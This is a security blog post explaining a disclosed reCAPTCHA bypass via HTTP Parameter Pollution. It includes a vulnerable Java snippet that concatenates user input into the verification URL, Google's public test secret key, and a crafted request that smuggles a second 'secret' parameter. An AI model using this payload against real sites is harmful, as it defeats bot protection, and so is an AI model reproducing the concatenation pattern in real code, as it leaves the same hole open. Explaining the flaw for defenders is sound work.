---
layout: post
title: Leveraging HTTP Parameter Pollution to Bypass reCAPTCHA
tags: [Cyber News]
---

## Background

reCAPTCHA is a Google service that allows web applications to present some challenges to the users to protect the web application against bots. When the web application wants to challenge the user, Google provides a set of images and uses JavaScript to show them in the browser. The user then solves the CAPTCHA and an HTTP request is sent to the web application which looks something like:
```
POST /verify-recaptcha-response HTTP/1.1
Host: vulnerable-app.com

recaptcha-response={reCAPTCHA-generated-hash}
```

The application then verifies the response with a request to Google's reCAPTCHA API with a request shown below:
```
POST /recaptcha/api/siteverify HTTP/1.1
Content-Length: 458
Host: www.google.com
Content-Type: application/x-www-form-urlencoded

recaptcha-response={reCAPTCHA-generated-hash}&secret={application-secret}
```

In this request, the hash of the user's response `reCAPTCHA-generated-hash` is sent along with the verification secret for identifying the web application `application-secret`. And google verifies the request by the web application and if the response is correct, it generates an HTTP response which looks something like this:
```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 90

{
  "success": true,
  "challenge_ts": "2018-01-29T17:58:36Z",
  "hostname": "..."
}
```

For testing new features on a new web application, Google has provided an automated of disabling reCAPTCHA verification. For this, the developers can use the hard-coded site and secret key as shown below:
```
Site key: 6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI
Secret key: 6LeIxAcTAAAAAGG-vFI1TnRWxMZNFuojJ4WifJWe
```

This will come in handy for generating the payload.

## HTTP Parameter Pollution
Supplying multiple HTTP parameters with the same name might cause a web application to interpret values in an unanticipated way and this effect can then be exploited by an adversary to bypass some implemented security mechanism. Such an approach is called as HTTP Parameter Pollution.

## The Attack
IF the web application that needs to be bypassed is vulnerable to HTTP Parameter Pollution and looks something like the example shown below, then a carefully crafted request can be used to bypass reCAPTCHA.
```
private String sendPost(String CaptchaResponse, String Secret) throws Exception {

    String url = "https://www.google.com/recaptcha/api/siteverify"+"?response="+CaptchaResponse+"&secret="+Secret;
    URL obj = new URL(url);
    HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
```

The exploit can be constructed as shown below:
```
POST /verify-recaptcha-response HTTP/1.1
Host: vulnerable-app.com

recaptcha-response=anything%26secret%3d6LeIxAcTAAAAAGG-vFI1TnRWxMZNFuojJ4WifJWe
```

Here we can see that the attacker has carefully constructed the reCAPTCHA response in such a way that the `anything` corresponds to a placeholder, `%26` is an URL encoded ampersand character, `secret` represents the parameter that needs to be injected, `%3d` is an URL encoded equals sign and `6Le...JWe` is the key that disables reCAPTCHA for any web application. Another thing to note here is that Google's reCAPTCHA API only looks at the first `secret` parameter value and ignores any other secret value that follows. So, when the attacker sends a specific crafted request to the web application, it sends the following HTTP request to the reCAPTCHA API.
```
POST /recaptcha/api/siteverify HTTP/1.1
Host: www.google.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Python-urllib/2.7

recaptcha-response=anything&secret=6LeIxAcTAAAAAGG-vFI1TnRWxMZNFuojJ4WifJWe&secret=6LeYIbsSAAAAAJezaIq3Ft_hSTo0YtyeFG-JgRtu
```

As specified above, only the first secret is used by the reCAPTCHA API and the following response is sent every time.
```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 90

{
  "success": true,
  "challenge_ts": "2018-01-29T17:58:36Z",
  "hostname": "..."
}
```

This response will be processed by the web application and the user is always granted access to the web application.

---

## References
\[1\] Riancho A., "reCAPTCHA Bypass via HTTP Parameter Pollution".

[1]: https://andresriancho.com/recaptcha-bypass-via-http-parameter-pollution/ "reCAPTCHA Bypass via HTTP Parameter Pollution"
---
